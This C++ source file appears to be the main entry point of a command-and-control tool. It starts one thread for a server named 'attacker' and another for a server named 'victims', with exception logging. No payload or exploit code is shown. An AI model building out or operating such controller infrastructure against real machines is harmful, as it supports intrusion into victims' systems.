#include <cstdint>
#include <iostream>
#include <sstream>

#include "controller/context.hpp"
#include "controller/server_attacker.hpp"
#include "controller/server_victims.hpp"

using namespace std;

void attacker_thread(){

	try
	{
		Context::server_attacker->start();
	}
	catch(exception &ex)
	{
		Context::logger_app->error(string(ex.what()));
	}
}

void victims_thread(){

	try
	{
		Context::server_victims->start();
	}
	catch(exception &ex)
	{
		Context::logger_app->error(string(ex.what()));
	}
}

int main(int argc, char *argv[]){

	Context::init_resources();

	thread attacker(attacker_thread);
	thread victims(victims_thread);

	attacker.join();
	victims.join();

	return 0;
}
